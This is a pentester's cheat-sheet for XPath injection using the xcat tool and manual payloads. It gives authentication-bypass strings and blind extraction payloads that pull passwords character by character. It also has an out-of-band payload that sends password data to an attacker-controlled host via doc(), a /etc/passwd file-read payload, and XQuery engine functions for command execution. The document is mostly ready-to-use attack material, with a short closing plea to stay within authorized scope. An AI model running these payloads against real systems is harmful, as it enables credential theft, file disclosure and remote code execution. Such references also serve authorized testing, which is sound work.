# xcat + manual XPath extraction — cheat-sheet (authorized only)

**xcat** (Tom Forbes, `pip install xcat`) is the reference XPath-injection tool: it confirms injection, then auto-extracts
the whole XML document via a boolean/OOB oracle, and can read files / do SSRF on XPath 2.0. Prove the injection **manually**
first (Burp + the differential test) so your report is clean and reproducible, then let xcat do the tedious extraction.

---

## Manual-first (confirm + context)
```
# 1) boolean differential in Repeater:
username=' or '1'='1        (TRUE, expect login/records)
username=' or '1'='2        (FALSE control)
# 2) quote context: try ' and " ; watch for XPath/XML parse errors
# 3) version: does string-length() work (1.0+)? does doc()/lower-case() (2.0+)?
# 4) then extract: poc/xpath_blind.py (or xcat) with a stable oracle
```

## xcat
```bash
pip install xcat

# basic: inject into `path`, keep other params fixed, learn TRUE by a body string
xcat run "http://target/search" query --true-string="results found" \
     --method GET

# POST login body, inject username, mark success:
xcat run "http://target/login" username \
     --method=POST --common-body "username=x&password=x" --true-string="Welcome"

# speed up with OOB (XPath 2.0 doc()) - xcat stands up a server and exfils out-of-band:
xcat --public-ip YOUR-IP run "http://target/q" query --true-string="ok"

# once connected, xcat gives you an interactive shell over the XML document:
#   ls / cat <node> / get-string //user[1]/password / structure
# XPath 2.0 extras (if available): file read + OOB
```
Flags/behavior vary by xcat version — run `xcat --help` and `xcat run --help`.

## Manual blind (what xcat automates)
```
# record count -> length -> chars:
' or count(//user)=5 or 'x'='y
' or string-length((//user[1]/password))=32 or 'x'='y
' or substring((//user[1]/password),1,1)='a' or 'x'='y     # iterate pos x charset, then //user[2]...

# XPath 2.0 OOB / file (xcat uses these under the hood):
' or doc(concat('http://', substring((//user[1]/password),1,1), '.YOUR-OOB/')) or '     # exfil via DNS/HTTP
' or unparsed-text('file:///etc/passwd')                                                # file read
```

## Tools
| Tool | Use |
|------|-----|
| **xcat** | Automated blind + OOB extraction, file read, interactive XML shell (1.0/2.0) |
| **Burp** (Repeater/Intruder) | Manual confirm, quote-context, charset iteration |
| **poc/xpath_fuzz.py** | Control-baselined detect + auth-bypass (low-FP) |
| **poc/xpath_blind.py** | Blind `count`/`string-length`/`substring` extractor |
| **Interactsh / OOB** | `doc()` SSRF/OOB confirmation + fast exfil channel |
| local **BaseX / eXist-db** | Reproduce XQuery RCE gadgets safely before firing |

## Native XML DB (XQuery) - engine RCE functions
```
BaseX     : proc:system('id')
MarkLogic : xdmp:spawn(...) / xdmp:document-load('http://...')
eXist-db  : util:eval("...") / file:read(...)
```

> Confirm manually, extract your OWN record/marker to prove impact, one benign OOB/file/command proof, then STOP.
> Throttle; redact secrets; don't dump prod. Authorized targets only.
